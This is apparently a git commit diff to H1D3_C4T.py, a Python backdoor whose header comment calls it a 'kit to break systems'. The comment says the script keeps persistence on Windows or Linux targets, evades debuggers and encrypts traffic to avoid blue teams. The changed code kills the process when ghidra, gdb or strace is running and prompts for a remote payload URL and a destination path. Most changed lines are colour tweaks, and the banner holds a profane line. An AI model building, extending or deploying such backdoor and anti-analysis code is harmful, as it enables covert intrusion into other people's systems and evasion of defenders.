f15077ef31c0a60b6f2836e85deefba58e3913f4
NullByte <121623691+NullByte-7w7@users.noreply.github.com>
2024-12-15 15:10:19 -0300

    Update H1D3_C4T.py

--- H1D3_C4T.py
+++ H1D3_C4T.py
@@ -1,6 +1,9 @@
 #!/usr/bin/python3
-# BACKDOOR MADE BY NULLBYTE
-# Github: https://github.com/NullByte-7w7
+# Author -> NullByte
+# Welcome to your kit to break systems, yes break systems, do not like to talk "tool". What does it do? well allows persistence on the target system, windows/linux automatically identifies the operating system running,
+# analyzes processes running debugger and thus terminates the backdoor, allows external payload or the backdoor itself so the attacker has more options to use, not only depending on the payload created by the backdoor,
+#after that it encrypts the communication in order to avoid discoveries in the network by sysadmin,blue team. in the future I will implement new features, such as porting to golang.
+
 
 import os
 from colorama import Fore
@@ -23,24 +26,24 @@ def check_system():
 def check_debugger_linux():
 
      for proc in psutil.process_iter(['pid','name']):     
-            debuggers = {'gidra','gdb'}
+            debuggers = {'ghidra','gdb','strace'}
             for debug in debuggers:    
                 if debug in proc.info['name'].lower():
-                    print("[!] FOUND PROCESS DEBUGGER")
+                    print("[!] FOUND PROCESS DEBUGGER KILL BACKDOOR")
                     sys.exit(1)
 
 
 
 def internal_backdoor_linux():
 
-    print(Fore.RED + "[!] BACKDOOR IS INTERNAL")
+    print(Fore.MAGENTA + "[!] BACKDOOR IS INTERNAL" + Fore.RESET)
  
 
 
 def external_backdoor_linux():
 
-    print(Fore.BLUE + "[!] BACKDOOR IS EXTERNAL")
-    choice_payload_attacker = input("[*] Is Your Payload On The Network Or On The Local Machine? surface/local => ")
+    print(Fore.GREEN + "[!] BACKDOOR IS EXTERNAL")
+    choice_payload_attacker = input(Fore.BLUE + "[*] Is Your Payload On The Network Or On The Local Machine? surface/local => ")
     if "surface" in choice_payload_attacker:
         url_payload = input("[@] URL YOUR PAYLOAD => ")
         url_payload_dest = input("[#] PUT DESTINATION PATH FOR PAYLOAD (example /tmp/) => ")
@@ -69,8 +72,8 @@ def external_backdoor_linux():
 
 
 
-print(Fore.RED + r'''
-
+print(Fore.CYAN + r'''
+    FUCK YOU BITKILL
        
            \`*-.                    
             )  _`-.                 
@@ -91,24 +94,24 @@ print(Fore.RED + r'''
 ''')
 
 print(Fore.GREEN + "-----------------------------------------------")
-print(Fore.WHITE + "[!] Checking Operating System...")
+print(Fore.GREEN + "[!] Checking Operating System...")
 check_system()
 print(Fore.GREEN + "[!] Checking Anti-Malware/Debuggers Running...")
 check_debugger_linux()
 print(Fore.GREEN + "-----------------------------------------------")
 
 if "linux" in check_system():
-    print("[!] SYSTEM LINUX")
-    choice_linux = input("[#] YOU WANT USE EXTERNAL BACKDOOR OR INTERNAL BACKDOOR? internal/external => ")
+    print(Fore.RED + "[!] SYSTEM LINUX")
+    choice_linux = input(Fore.BLUE + "[#] YOU WANT USE EXTERNAL BACKDOOR OR INTERNAL BACKDOOR? internal/external => ")
     if "internal" in choice_linux:
         internal_backdoor_linux()
     elif "external" in choice_linux:
         external_backdoor_linux()
     else:
-        print("[!] Write internal or external try again! 7w7")
+        print(Fore.RED + "[!] Write internal or external try again! 7w7")
         sys.exit(1)
 elif "windows" in check_system():
-    print("[!] SYSTEM WINDOWS!")
+    print(Fore.BLUE + "[!] SYSTEM WINDOWS!")
     choice_windows = input("[#] YOU WANT USE EXTERNAL BACKDOOR OR INTERNAL BACKDOOR? internal/external => ")
 else:
     print("[!] MACHINE UNKNOW")
